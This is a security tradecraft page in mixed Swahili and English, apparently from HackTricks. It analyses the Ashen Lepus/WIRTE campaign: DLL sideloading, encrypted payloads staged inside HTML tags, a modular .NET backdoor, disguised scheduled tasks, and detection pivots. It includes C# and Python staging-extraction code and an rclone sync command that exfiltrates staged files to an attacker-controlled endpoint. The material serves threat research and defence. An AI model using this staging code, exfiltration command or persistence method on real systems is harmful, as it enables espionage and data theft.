# DLL Side-Loading ya Juu na HTML-Embedded Payload Staging

{{#include ../../../banners/hacktricks-training.md}}

## Muhtasari wa Tradecraft

Ashen Lepus (aka WIRTE) alitumia namna inayoweza kurudiwa inayounganisha DLL sideloading, staged HTML payloads, na modular .NET backdoors ili kudumu ndani ya mitandao ya kidiplomasia ya Mashariki ya Kati. Mbinu hii inaweza kutumika tena na mdhibiti yeyote kwa sababu inategemea:

- **Archive-based social engineering**: PDF zisizo hatari zinawaelekeza walengwa kuvuta RAR archive kutoka kwenye tovuti ya kushirikisha faili. archive linabeba viewer EXE linaloonekana halali, DLL hatarishi iliyopangwa jina la maktaba ya kuaminika (mfano `netutils.dll`, `srvcli.dll`, `dwampi.dll`, `wtsapi32.dll`), na `Document.pdf` ya kumdanganya.
- **DLL search order abuse**: mshambuliaji bonyeza mara mbili EXE, Windows inarekebisha import ya DLL kutoka saraka ya sasa, na loader hatarishi (AshenLoader) hufanya kazi ndani ya mchakato wa kuaminika wakati PDF ya kuonesha inafunguka ili kuepuka mashaka.
- **Living-off-the-land staging**: kila hatua ya baadaye (AshenStager → AshenOrchestrator → modules) huhifadhiwa sio kwenye diski mpaka itakapohitajika, ikiletwa kama blobs zilizosimbwa zilizofichwa ndani ya majibu ya HTML yasiyotokea hatari.

## Mnyororo wa Ngazi-Ngazi wa Side-Loading

1. **Decoy EXE → AshenLoader**: EXE inafanya side-load ya AshenLoader, ambayo inafanya recon ya mwenyeji, inaisimbua kwa AES-CTR, na kuifanya POST ndani ya parameta zinazobadilika kama `token=`, `id=`, `q=`, au `auth=` kwa njia zinazoonekana kama API (mfano `/api/v2/account`).
2. **HTML extraction**: C2 hutoa tu hatua inayofuata wakati tu IP ya mteja ina geolocate kwa eneo lengwa na `User-Agent` inafanana na implant, ikileta frustrate kwa sandboxes. Wakati ukaguzi unapita, mwili wa HTTP una `<headerp>...</headerp>` blob yenye AshenStager payload iliyosimbwa Base64/AES-CTR.
3. **Second sideload**: AshenStager inawekwa kwa binary nyingine halali ambayo inimport `wtsapi32.dll`. Nakala hatarishi iliyosukumwa ndani ya binary inachukua HTML zaidi, wakati huu ikichonga `<article>...</article>` kurejesha AshenOrchestrator.
4. **AshenOrchestrator**: controller modular .NET inayotafsiri config ya JSON iliyokuwa Base64. Sehemu za config `tg` na `au` zinaunganishwa/kuwekwa hash kuwa AES key, ambayo huidet decrypt `xrk`. Bytes zinazopatikana hutumika kama XOR key kwa kila module blob inayopatikana baadaye.
5. **Module delivery**: kila module inaelezewa kupitia maoni ya HTML yanayomwelekeza parser kwa tag yoyote ile, kuvunja kanuni za static zinazotafuta tu `<headerp>` au `<article>`. Modules ni pamoja na persistence (`PR*`), uninstallers (`UN*`), reconnaissance (`SN`), screen capture (`SCT`), na file exploration (`FE`).

### HTML Container Parsing Pattern
```csharp
var tag = Regex.Match(html, "<!--\s*TAG:\s*<(.*?)>\s*-->").Groups[1].Value;
var base64 = Regex.Match(html, $"<{tag}>(.*?)</{tag}>", RegexOptions.Singleline).Groups[1].Value;
var aesBytes = AesCtrDecrypt(Convert.FromBase64String(base64), key, nonce);
var module = XorBytes(aesBytes, xorKey);
LoadModule(JsonDocument.Parse(Encoding.UTF8.GetString(module)));
```
Hata kama walinzi wanazuia au kuondoa kipengele maalum, mtendaji anahitaji tu kubadilisha tag iliyotajwa katika maoni ya HTML ili kuendelea na utoaji.

### Msaidizi wa Utoaji wa Haraka (Python)
```python
import base64, re, requests

html = requests.get(url, headers={"User-Agent": ua}).text
tag = re.search(r"<!--\s*TAG:\s*<(.*?)>\s*-->", html, re.I).group(1)
b64 = re.search(fr"<{tag}>(.*?)</{tag}>", html, re.S | re.I).group(1)
blob = base64.b64decode(b64)
# decrypt blob with AES-CTR, then XOR if required
```
## Mwingiliano ya HTML Staging Evasion

Utafiti wa hivi karibuni wa HTML smuggling (Talos) unaonyesha payloads zilizofichwa kama Base64 strings ndani ya `<script>` blocks katika HTML attachments na kuziweka decoded kwa JavaScript wakati wa runtime. Njia ile ile inaweza kutumika kwa majibu ya C2: stage encrypted blobs ndani ya script tag (au element nyingine ya DOM) na kuzitafsiri kwa in-memory kabla ya AES/XOR, ikifanya ukurasa uonekane kama HTML ya kawaida.

## Crypto & C2 Hardening

- **AES-CTR everywhere**: current loaders embed 256-bit keys plus nonces (e.g., `{9a 20 51 98 ...}`) and optionally add an XOR layer using strings such as `msasn1.dll` before/after decryption.
- **Infrastructure split + subdomain camouflage**: staging servers are separated per tool, hosted across varying ASNs, and sometimes fronted by legitimate-looking subdomains, so burning one stage doesn't expose the rest.
- **Recon smuggling**: enumerated data now includes Program Files listings to spot high-value apps and is always encrypted before it leaves the host.
- **URI churn**: query parameters and REST paths rotate between campaigns (`/api/v1/account?token=` → `/api/v2/account?auth=`), invalidating brittle detections.
- **Gated delivery**: servers are geo-fenced and only answer real implants. Unapproved clients receive unsuspicious HTML.

## Persistence & Execution Loop

AshenStager drops scheduled tasks that masquerade as Windows maintenance jobs and execute via `svchost.exe`, e.g.:

- `C:\Windows\System32\Tasks\Windows\WindowsDefenderUpdate\Windows Defender Updater`
- `C:\Windows\System32\Tasks\Windows\WindowsServicesUpdate\Windows Services Updater`
- `C:\Windows\System32\Tasks\Automatic Windows Update`

These tasks relaunch the sideloading chain on boot or at intervals, ensuring AshenOrchestrator can request fresh modules without touching disk again.

## Kutumia Benign Sync Clients kwa Exfiltration

Operators stage diplomatic documents inside `C:\Users\Public` (world-readable and non-suspicious) through a dedicated module, then download the legitimate [Rclone](https://rclone.org/) binary to synchronize that directory with attacker storage. Unit42 notes this is the first time this actor has been observed using Rclone for exfiltration, aligning with the broader trend of abusing legitimate sync tooling to blend into normal traffic:

1. **Stage**: copy/collect target files into `C:\Users\Public\{campaign}\`.
2. **Configure**: ship an Rclone config pointing at an attacker-controlled HTTPS endpoint (e.g., `api.technology-system[.]com`).
3. **Sync**: run `rclone sync "C:\Users\Public\campaign" remote:ingest --transfers 4 --bwlimit 4M --quiet` so the traffic resembles normal cloud backups.

Kwa kuwa Rclone inatumiwa sana kwa workflows za backup halali, defenders wanapaswa kuzingatia executions zisizo za kawaida (new binaries, odd remotes, au syncing ghafla ya `C:\Users\Public`).

## Detection Pivots

- Alert on **signed processes** that unexpectedly load DLLs from user-writable paths (Procmon filters + `Get-ProcessMitigation -Module`), especially when the DLL names overlap with `netutils`, `srvcli`, `dwampi`, or `wtsapi32`.
- Inspect suspicious HTTPS responses for **large Base64 blobs embedded inside unusual tags** or guarded by `<!-- TAG: <xyz> -->` comments.
- Extend HTML hunting to **Base64 strings inside `<script>` blocks** (HTML smuggling-style staging) that are decoded via JavaScript before AES/XOR processing.
- Hunt for **scheduled tasks** that run `svchost.exe` with non-service arguments or point back to dropper directories.
- Monitor for **Rclone** binaries appearing outside IT-managed locations, new `rclone.conf` files, or sync jobs pulling from staging directories like `C:\Users\Public`.

## References

- [Hamas-Affiliated Ashen Lepus Targets Middle Eastern Diplomatic Entities With New AshTag Malware Suite](https://unit42.paloaltonetworks.com/hamas-affiliate-ashen-lepus-uses-new-malware-suite-ashtag/)
- [Hidden between the tags: Insights into evasion techniques in HTML smuggling](https://blog.talosintelligence.com/hidden-between-the-tags-insights-into-evasion-techniques-in-html-smuggling/)

{{#include ../../../banners/hacktricks-training.md}}
